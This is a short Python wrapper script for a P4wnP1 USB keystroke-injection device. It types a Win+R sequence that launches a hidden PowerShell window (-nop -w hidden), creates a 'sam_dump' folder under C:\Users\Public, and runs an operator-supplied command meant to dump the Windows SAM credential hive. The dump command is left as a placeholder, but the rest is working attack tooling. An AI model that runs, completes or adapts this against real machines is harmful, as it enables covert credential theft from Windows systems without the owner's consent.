#!/usr/bin/env python3
# Wrapper to run YOUR offline hive copy method/tool. Writes to C:\Users\Public\sam_dump.
import os, sys, time
P4WN_HOME=os.getenv("P4WN_HOME","/opt/p4wnp1"); sys.path.insert(0, os.path.join(P4WN_HOME,"tools"))
from hid_type import win_r, type_string

OUT = os.getenv("P4WN_OUT_DIR", r"C:\Users\Public\sam_dump")
CMD = os.getenv("P4WN_SAM_CMD",  r"echo YOUR_SAM_DUMP_HERE > C:\Users\Public\sam_dump\README.txt")

def main():
    win_r(); time.sleep(0.4); type_string("powershell\n"); time.sleep(0.8)
    ps = f"New-Item -Force -ItemType Directory -Path '{OUT}' >$null; {CMD}; Write-Host 'OK';"
    type_string(f"powershell -nop -w hidden -c \"{ps.replace('\"','\"\"')}\"\n")
    print("[*] SAM wrapper executed. (Provide P4WN_SAM_CMD).")
    return 0

if __name__=='__main__': sys.exit(main())
